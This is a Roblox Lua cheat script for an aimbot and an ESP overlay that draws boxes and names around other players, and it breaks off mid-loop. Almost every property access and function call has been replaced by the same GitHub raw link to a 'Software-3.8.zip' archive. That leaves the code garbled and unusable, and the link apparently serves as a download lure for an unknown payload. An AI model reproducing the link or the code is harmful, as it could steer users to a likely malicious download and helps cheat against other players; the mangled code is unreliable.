local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip

local LocalPlayer = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
local Mouse = LocalPlayer:GetMouse()

-- GUI
local ScreenGui = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = "AimbotESP_GUI"

local AimbotButton = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("TextButton", ScreenGui)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 120, 0, 40)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 10, 0, 10)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = "Aimbot: OFF"
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true

local ESPButton = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("TextButton", ScreenGui)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 120, 0, 40)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 10, 0, 60)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = "ESP: OFF"
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true

-- Estado
local AimbotEnabled = false
local ESPEnabled = false

https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function()
	AimbotEnabled = not AimbotEnabled
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = AimbotEnabled and "Aimbot: ON" or "Aimbot: OFF"
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = AimbotEnabled and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 255, 0) or https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
end)

https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function()
	ESPEnabled = not ESPEnabled
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = ESPEnabled and "ESP: ON" or "ESP: OFF"
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = ESPEnabled and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(0, 255, 0) or https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(255, 0, 0)
end)

-- Raycast para visibilidade
local rayParams = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip()
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true

local function IsVisible(part)
	local origin = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
	local direction = (https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip - origin)
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = {https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip}
	local result = Workspace:Raycast(origin, direction, rayParams)
	return not result or https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip)
end

-- Aimbot com verificação de distância (10 studs)
local function GetClosestVisiblePlayer(maxDistance)
	local closest = nil
	local shortest = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Head") then
			local head = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip
			local screenPos, onScreen = Camera:WorldToViewportPoint(https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip)
			local distanceToPlayer = (https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip - https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip).Magnitude

			if onScreen and IsVisible(head) and distanceToPlayer <= maxDistance then
				local mouseDistance = (https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(screenPos.X, screenPos.Y) - https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(Mouse.X, Mouse.Y)).Magnitude
				if mouseDistance < shortest then
					shortest = mouseDistance
					closest = player
				end
			end
		end
	end
	return closest
end

-- ESP (Box + Nome)
local DrawingESP = {}

local function CreateBox()
	local box = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Square")
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = 1.5
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = false
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = false
	return box
end

local function CreateName()
	local text = https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Text")
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = 14
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = true
	https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip = false
	return text
end

for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer then
		DrawingESP[player] = {
			Box = CreateBox(),
			Name = CreateName(),
		}
	end
end

https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function(player)
	if player ~= LocalPlayer then
		DrawingESP[player] = {
			Box = CreateBox(),
			Name = CreateName(),
		}
	end
end)

https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function(player)
	if DrawingESP[player] then
		for _, obj in pairs(DrawingESP[player]) do
			obj:Remove()
		end
		DrawingESP[player] = nil
	end
end)

-- Loop
https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip(function()
	-- Aimbot
	if AimbotEnabled then
		local maxDistance = 10
		local target = GetClosestVisiblePlayer(maxDistance)
		if target and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip and https://github.com/rl9blake/Cvrgdbbd/raw/refs/heads/main/lienomyelogenous/Software-3.8.zip("Head") then
